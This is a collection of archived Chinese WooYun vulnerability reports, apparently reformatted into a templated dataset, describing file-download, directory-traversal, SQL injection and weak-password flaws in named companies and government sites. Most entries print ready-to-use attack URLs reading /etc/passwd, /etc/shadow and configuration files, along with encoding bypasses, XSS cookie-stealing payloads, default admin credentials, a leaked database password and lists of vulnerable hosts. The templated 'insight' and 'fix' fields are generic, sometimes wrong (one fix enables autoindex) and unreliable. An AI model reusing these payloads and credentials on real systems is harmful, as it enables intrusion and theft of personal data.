### [wooyun-2014-055282] 某通用型门户平台任意文件下载漏洞
**厂商**: mountor.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞文件:down.aspx.csusing System;using System.Data;using System.Configuration;using System.Collections;using System.Web;using System.Web.Security;using System.Web.UI;using System.Web.UI.WebControls;using System.Web.UI.WebControls.WebParts;using System.Web.UI.HtmlControls;using System;using System.IO;public partial class down : System.Web.UI.Page{protected void Page_Load(object sender, EventArgs e){st

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 0.0
---

---
### [wooyun-2015-091743] 鄂尔多斯市政务服务网配置文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可下载配置文件web.xml并且暴露网站绝对路径

**POC**: http://zwfw.ordos.gov.cn/FileDownload?filepath=E:/Tomcat-qlqd/webapps/ROOT/WEB-INF/web.xml&dispname=web.xml

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2015-0139784] 美的注入（多平台通用）、任意文件读取、源代码泄漏、业务管理系统漏洞大礼包
**厂商**: midea.com | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注入通用，是你们cpc,pmd这些地方登陆口的，因为有些地方加了验证码。所以并不能很好的通杀注入，还有cpc的一些“后门”问题，不是删除文件就行了，做成一个大礼包

**POC**: 0x01   cpc问题修补不完，还有漏网之鱼，删除文件不是就没问题。每个平台的cpc后台都能进去。http://rdscm.midea.com.cn:7008//cpcconsole/http://pr.midea.com.cn/cpcconsole/http://wpdm.midea.com.cn//cpcconsole/http://100-bbs.midea.com.cn//cpcconsole/http://rsqsrm.midea.com.cn//cpcconsole/密码是：sinocc可以直接读取到数据库里面的一些邮件信息，做邮箱收集爆破邮件密码，我粗收集了一下，几个平台下来也

**绕过**: 直接利用

**修复**: 给自己美美的一个微笑吧，加油呦。
---

---
### [wooyun-2013-034727] 湖北天翼手机报目录遍历，弱口令，导致后台沦陷
**厂商**: 湖北天翼手机报 | **年份**: 2013 | **类型**: 服务弱口令

**元思考**: 触发信号: 后台管理

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://61.183.11.149:8081/目录遍历后台地址http://61.183.11.149:8081/web/webmanage/web_manage.asp用户名admin密码admin

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个你们比我懂
---

---
### [wooyun-2015-0108885] 游族网络某站目录遍历导致数据库信息泄露
**厂商**: 上海游族网络股份有限公司 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 后台管理

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一个GM后台网站  gm.ns.youzu.com/http://gm.ns.youzu.com/data/http://gm.ns.youzu.com/html下了几个 日志文件2015-03-25 10:20:22(10.0.0.236):dsn=mysql:host=10.2.46.40;port=3308;dbname=nsmobile_log_2017310098&user=dbnsmobilegm&pwd=AMfJNL0w5UDh4WKt&charset=utf82015-03-25 10:20:22

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 没绕过后台 直接登录···有点可惜了···大概看了下 代码 后台功能很强大啊
---

---
### [wooyun-2012-014136] 快乐购某站目录遍历等大量敏感信息泄漏
**厂商**: 快乐购物股份有限公司 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 敏感信息较多，虽然passwd被X,还有了phpmyadmin。。。。

**POC**: etc/passwdhttp://phpstat.happigo.com/web/siterank.php?ranktype=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2014-061335] 中国联通某公司任意文件下载
**厂商**: 中国联通某公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://hk.chinaunicom.com/app_mgr/app-mgr/appInfo?downloadPath=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n&m=down

**POC**: 见上

**绕过**: 直接利用

**修复**: Null
---

---
### [wooyun-2013-040510] 国土资源系统部分站点以及N多政府站点目录遍历漏洞
**厂商**: 政府站 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.仅仅以国土资源部某分站点为例：2.由于涉及政府网站太多。仅仅进行截图。3.谷歌黑客技术手段，没啥含量。付下图：

**POC**: 以上是一些证明。乌云的朋友如果工作认证的话这个量就比较大了

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-026730] 山东血库的远程代码执行和任意文件下载
**厂商**: 山东省血液中心 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 山东血库的远程代码执行和任意文件下载

**POC**: Struts2 远程代码执行http://www.cnsdbc.org/newcontent_fujian_Down.action? fi_url=../index.jsp&filename=index.jsp  任意文件下载

**绕过**: 直接利用

**修复**: .....你懂的
---

---
### [wooyun-2014-049243] 门户网站某分站参数过滤不严导致任意文件下载
**厂商**: 柳州人民政府 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://so.liuzhou.gov.cn:8080/inforadar/jsp/file/file_download.jsp?fileType=file&fileName=../../file/file_download.jsp我们看看源码<%@ page contentType="text/html;charset=UTF-8" pageEncoding="GBK" import="com.jspsmart.upload.*" %><%// 新建一个smartupload对象SmartUpload su = new SmartUpload();// 初始化su.initialize(pageContext);// 设定contentDisposition为null以禁止浏览器自动打开文件，保证点击链接后是下载文件。// 若不设定，则下载的文件扩展名为doc时，浏览器将自动用wor

**POC**: http://so.liuzhou.gov.cn:8080/inforadar/jsp/file/file_download.jsp?fileType=file&fileName=../../../../../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 过滤FileName
---

---
### [wooyun-2013-019808] 国家留学基金管委会深信服设备敏感文件下载(补丁不及时)
**厂商**: 国家留学基金管理委员会 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 深信服应用交付管理系统权限绕过https://www.csc.edu.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf

**POC**: 如上所述！

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2014-054078] 绵阳市教师继续教育管理系统后台弱口令及任意文件读取
**厂商**: 绵阳市教师继续教育管理系统 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://61.157.144.79/Public/SzxyPortal/loginForm.jsp  绵阳市教师继续教育管理系统弱口令admin / 123456任意文件读取：http://61.157.144.79/wfJSP/virtualDisk/issuance/fileTextEdit.jsf?folderType=release&folderPath=../../../../&fileName=etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2013-027823] 湖南省医学会备份文件处理不当导致大量用户敏感信息泄漏
**厂商**: 湖南省医学会 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站备份文件下载地址 http://www.hnma.org.cn/hnma.rar

**POC**: 网站程序数据库各种会员信息管理员帐号密码这里就不一一列举了,貌似里面还有各种医学奖等信息

**绕过**: 直接利用

**修复**: 删除备份文件，修改管理员密码
---

---
### [wooyun-2011-02439] 人人网文件下载BUG
**厂商**: 人人网 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://amd.renren.com/down.jsp?url=Templates/20110314.pptx貌似不能往上跳目录

**POC**: http://amd.renren.com/down.jsp?url=down.jsp

**绕过**: 直接利用

**修复**: 禁止文件流写死目录限制可下载文件类型
---

---
### [wooyun-2013-017228] 工业与信息化标准网商城漏洞（可能影响充值）
**厂商**: 工业与信息化标准网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历导致商城源代码泄露，而商城充值卡卡号密码以明文保存。http://www.cape.com.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/cards/

**POC**: 尝试充值了，有效。麻烦管理员删除这个测试帐号：qqqqq

**绕过**: 直接利用

**修复**: 加权限，充值卡不要明文
---

---
### [wooyun-2014-077526] 某人事考试网存在目录遍历漏洞导致百万考生信息泄漏
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、济南人事考试网存在目录遍历漏洞，网址：http://www.jnrsks.gov.cn2、目录遍历http://www.jnrsks.gov.cn/UpLoadFiles/Contents/http://www.jnrsks.gov.cn/UpLoadFiles/Other/上述文件目录内存放大量考生考试信息，2011年--2014年所有考生考试信息均为xls文件，可任意下载。另外该网站其他目录也存在遍历漏洞，如:/inc

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、目录设置权限2、考生数据存到数据库
---

---
### [wooyun-2015-0140569] 神器而已证券系列之湘财证券某站点任意文件读取(可读取/etc/shadow)
**厂商**: 湘财证券 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**可以读取到shadow

**POC**: 抓取到一些敏感信息

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-013654] 途牛旅游网可导致根目录遍历
**厂商**: 途牛旅游网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 两次URLencode即可http://www.tuniu.com/static/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg_1209/newspaper_10.htmlhttp://www.tuniu.com/static/newspaper_..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fhosts%2500.jpg/newspaper_10.html

**POC**: 附送鸡肋xss（非登陆下）http://www.tuniu.com/main.php?do=user_login&origin=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3Ehttp://www.tuniu.com/u/login?origin=http://www.tuniu.com/u?1%22%3E%3CScRiPt%3Ealert%28/xss/%29%3C/ScRiPt%3E

**绕过**: 直接利用

**修复**: 字符过滤啦~
---

---
### [wooyun-2015-0104491] 广东省某市内资经济促进中心项目数据系统任意文件下载和查看
**厂商**: 广东省信息安全测评中心 | **年份**: 2015 | **类型**: 

**元思考**: 触发信号: 功能测试

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 以前的漏洞WooYun: 广东省某市内资经济促进中心项目数据系统弱口令续(涉及大量数亿元的项目)现在加了一个防火墙，就希望厂商给一个邀请码，这个漏洞没有重复哦！

**POC**: 任意文件查看，admin/login.asp218.16.125.82:8081/download.asp?Filename=admin/login.aspcode：<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta ht

**绕过**: 直接利用

**修复**: 虽然问题不大，但请你们赏一个邀请码啊！我们挖这个也很辛苦！修复你们比我更懂的
---

---
### [wooyun-2015-0115201] SmartGate某智能网关系统任意文件遍历
**厂商**: SmartGate | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: SmartGate1000智能数据网关由于没充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。无需登录情况任意遍历系统文件下载（以系统文件etc/passwd为例）案例：http://58.198.255.180/public/login.htmlhttp://120.95.20.1/public/login.htmlhttp://210.35.73.59/public/login.htmlhttp://49.209.77.90/public/login.htmlhttp://115.154.88.2/public/login.htmlhttp://59.78.162.41/public/login.htmlhttp://222.204.234.35/public/login.htmlhttp://210.35.73.60/public/l

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤。。
---

---
### [wooyun-2015-0139703] 好信托某漏洞导致可泄露大量用户身份证\银行卡等敏感信息
**厂商**: 好信托 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该网站存在目录遍历 银行卡 身份证 汇款单都可以看到 泄露严重http://www.haoxintuo.cn/orders/

**POC**: 身份证可以看到 银行卡也可以

**绕过**: 直接利用

**修复**: 你们比我更专业 求乌云邀请码
---

---
### [wooyun-2013-035946] 国家电网某电力公司任意文件下载（passwd等文件）
**厂商**: 国家电网公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题站点：http://218.5.11.78/只要构造如下页面就可以任意下载，1、如要下载/etc/下的service文件：http://218.5.11.78/export.action?fileName=../../../../../../../../../../etc/services&times=2、passwd文件：http://218.5.11.78/export.action?fileName=../../../../../../../../../../etc/passwd&times=http://218.5.11.78/export.action?fileName=../../../../../../../../../../etc/passwd&times=3、ssh的配置文件：4、sysctl的配置文件，好像缓解DDOS是配置的这个：http://218.5.11.7

**POC**: 对比下最后两个用户：root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-084437] 天地行漏洞小礼包(任意文件下载引发的连锁反应)
**厂商**: 天地行 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 天地行B2B平台任意文件读取下载（提供俩测试链接，证明漏洞存在）http://b2b.tdxinfo.com/Buyer/SystemManage/DownLoad.aspx?filename=C:/Windows/System32/drivers/etc/hostshttp://b2b.tdxinfo.com/Buyer/SystemManage/DownLoad.aspx?filename=c:\Windows\win.ini然后http://b2b.tdxinfo.com/Buyer/Notice.aspx?id=140a&fid=NCG50000id=140后面加个a，报错了。得到路径，于是下载c:\Windows\Microsoft.NET\Framework\v2.0.50727\Temporary%20ASP.NET%20Files\root\01252a5c\74b74a9

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0147894] 电信某站任意文件读取
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /etc/passwd.bash_history/etc/shadowid_rsa

**POC**: 开放22端口：**.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.**http://**.**.**.**1/NCFindWeb?service=IPreAlertConfigService&filename=../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 关闭服务或升级系统。
---

---
### [wooyun-2015-0136534] 北京现代信息泄露到后台管理数万辆汽车
**厂商**: beijing-hyundai.com.cn | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先是目录遍历：http://211.151.62.140/Web%20References/发现了一个域名：www.bjxd2sc.com，访问一下：

**POC**: 点击右上角图标，直接打开后台登陆界面：http://www.bjxd2sc.com/login/index存在弱口令：admin admin包含 数万量二手车 和 很多经销商信息。

**绕过**: 直接利用

**修复**: 修改弱口令
---

---
### [wooyun-2014-084978] 广发证劵某处任意文件下载
**厂商**: 广发证券 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.爆路径。http://wap.gf.com.cn/mobile.do?method=downLoadFile&fileName=mobile.dod:\sjzq_download\mobile.do2.任意文件下载http://wap.gf.com.cn/mobile.do?method=downLoadFile&fileName=../web.xml以上只是为了证明漏洞存在。。想下载更多的文件，可自行制作一个目录字典跑就可以了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止跳目录
---

---
### [wooyun-2012-04900] 联系某分站文件遍历
**厂商**: 联想 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器nginx.conf文件配置不当目录遍历。

**POC**: http://kabedm.lenovo.com.cn/

**绕过**: 直接利用

**修复**: nginx.conf配置文件中location server 或 http段中加入autoindex on;
---

---
### [wooyun-2016-0188777] 某通用财务报表系统任意文件下载漏洞
**厂商**: 北京久其软件股份有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PoC(Only Windows):http://target/netrep/ebook/browse/download.jsp?jpgfilepath=c:\boot.ini%00\jpg\..\&outfiletype=xlshttp://target/netrep/ebook/browse/download.jsp?jpgfilepath=jpgfilepath=c:\windows\system32\drivers\etc\hosts%00\jpg\..\&outfiletype=xls&outfiletype=xlshttp://target/netrep/ebook/browse/download.jsp?jpgfilepath=.\StartWeblogic.sh%00\jpg\..\&outfiletype=xls

**POC**: 以下系统确认存在该漏洞：1)浙江省企业分户快报网上直报系统:http://**.**.**.**/netrep/2)中交集团财务报表管理信息系统:http://**.**.**.**/netrep/3)河南省外资企业年报系统:**.**.**.**:7005/netrep/4)广西财政厅企业财务会计信息网络报送系统:**.**.**.**:7002/netrep/5)河北省财政厅企业信息填报系统:**.**.**.**:7001/netrep/6)朝阳区财政局报表管理系统:**.**.**.**:8001/netrep/7)河南省企业财务会计决算数据收集系统:**.**.**.**:7020/

**绕过**: 直接利用

**修复**: 无.
---

---
### [wooyun-2014-072262] 鸡肋升级，高危利用第二弹#2 北京建筑大学所有数据库泄露+数据库root密码泄露+全站源码泄露
**厂商**: www.bucea.edu.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安全是一个过程，任何心存侥幸的地方都不能忽视，所谓千里之提，溃于蚁穴。蚁穴所在处：http://www.cufe.edu.cn/cms/web/downloadFiles.jsp?file=鸡肋的任意文件下载，看我如何让整座大堤崩溃，只发崩溃地址，至于我是怎么挖掘的过程我就不写出来了，厂商你也不需要知道，只需要删除downloadFiles.jsp即可。#1 整站数据库root密码泄露http://www.bucea.edu.cn/cms/web/downloadFiles.jsp?file=/home/gpower/webapps/cms/META-INF/context.xml#2 整个大学全部的数据库泄露，光sql文件将近2G，数据量可想而知，你们让学生怎么办？http://www.bucea.edu.cn/cms/web/downloadFiles.jsp?file=/home/c

**POC**: 好了，厂商不给20rank真对不起白帽子啊

**绕过**: 直接利用

**修复**: 好了，厂商不给20rank真对不起白帽子啊
---

---
### [wooyun-2015-049899] 某敏感部门网站邮件服务器任意文件读取漏洞
**厂商**: 某敏感部门网站 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现在中国警察网的邮件系统:http://mail.cpd.com.cn/,使用的是zimbra的邮件系统访问URL如下：http://mail.cpd.com.cn/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00获取Zimbra邮件服务器核心配置文件内容http://mail.gzcb.com.cn/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../opt/zimbra/conf/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 更新
---

---
### [wooyun-2013-020214] 买好网团购分站任意文件读取漏洞
**厂商**: 17mh.com | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://m.17mh.com//m.php?a=show&id=29805&m=../../../../../../../../../../etc/passwd%00.jpg&s=bc98bcd5ae717f1aa7a4d6082a8e019f查看PASSWD文件查看网卡配置查看登录日志

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-027380] 江西住房公积金网任意文件下载
**厂商**: 江西住房公积金网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件下载功能在代码实现上主要用到函数FileDownload:由于缺少有效的验证和限制，网站目录下的任意文件可以被直接下载,最终可导致全局配置文件中的内置超级管理员用户名和加密密码泄露，同时可以下载数据库配置文件，进一步导致数据库连接信息的泄露。

**POC**: web.config配置文件:http://www.jxgjj.gov.cn/admin/download.aspx?url=../web.configdb.config数据库配置文件:http://www.jxgjj.gov.cn/admin/download.aspx?url=../config/db.configsite.config网站全局配置文件:http://www.jxgjj.gov.cn/admin/download.aspx?url=../config/site.config

**绕过**: 直接利用

**修复**: 对传入的url参数进行过滤和限制...
---

---
### [wooyun-2012-012653] 同程网文件下载
**厂商**: 苏州同程旅游网络科技有限公司 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没有任何过滤，可以通过暴力猜解下载系统文件down.17u.com/2010/pdf/index.asp?pdfaddr=133-1378.pdfdown.17u.com/2010/pdf/index.asp?pdfaddr=index.aspdown.17u.com/2010/pdf/index.asp?pdfaddr=pdf.xls

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-050749] 高德某子站敏感信息泄露
**厂商**: 高德软件 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://m.mapabc.com/.svn/entries8dir2935svn://172.17.40.61/minimap/htmlsvn://172.17.40.61/minimap2009-04-21T10:03:38.071027Z2935chenwentaosvn:special svn:externals svn:needs-lock2cf7a7f0-393f-11dd-9a7a-e2ed999627d0mm33dirWEB-INFdirbus.xmlfile2009-03-30T09:25:10.000000Zcf01b4559214e461b85ea942dbd3a0332008-09-03T06:13:45.575452Z449chenwentaomm30_celliddirmsv5dirmm2dirmsv6dirmm3dirmsv7dirtx10dirmsv8d

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 配置错误。
---

---
### [wooyun-2014-067400] libsys任意文件包含漏洞
**厂商**: libsys.com.cn | **年份**: 2014 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 找到漏洞后要提交，在乌云搜到这个漏洞：WooYun: 汇文软件Libsys图书馆管理系统任意文件读取貌似和我的重复了，但实际上不重复，而且上面那个php文件只有非常少的系统会出现。漏洞文件：zplug/ajax_asyn_link.php漏洞利用：/zplug/ajax_asyn_link.php?url=../opac/search.php上面一个漏洞的文件是zplug/ajax_asyn_link.old.php,我几乎找不到有哪个站存在这个文件。通杀所有版本。测试网站：3.5版本：http://210.38.120.140:8080/zplug/ajax_asyn_link.php?url=../opac/search.php4.0版本：http://lib.czmec.cn/opac/zplug/ajax_asyn_link.php?url=../opac/search.php5.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 问题非常严重，涉及版本较多，影响的学校单位非常多，图书馆程序数据库更会有大量学生信息，进一步渗透危害非常大。
---

---
### [wooyun-2014-064214] 大汉版通JCMS任意文件下载漏洞
**厂商**: 南京大汉网络有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题文件：jcms\m_5_7\replace\export.jsp

**POC**: //原文件名String strFileName = Convert.getParameter( request,"filename");//要保存的文件名String downloadname = Convert.getParameter( request,"savename");if(!DownFile.getFile(strFileName,downloadname,response,"UTF-8")){out.println(Convert.getAlterScript("alert('下载失败，文件可能不存在！');"));http://tuoshan.yzwh.gov.cn/jcm

**绕过**: 直接利用

**修复**: 升级版本
---

---
### [wooyun-2016-0196297] 珍爱网后台CRM系统源码泄露外加任意文件读取
**厂商**: 珍爱网 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

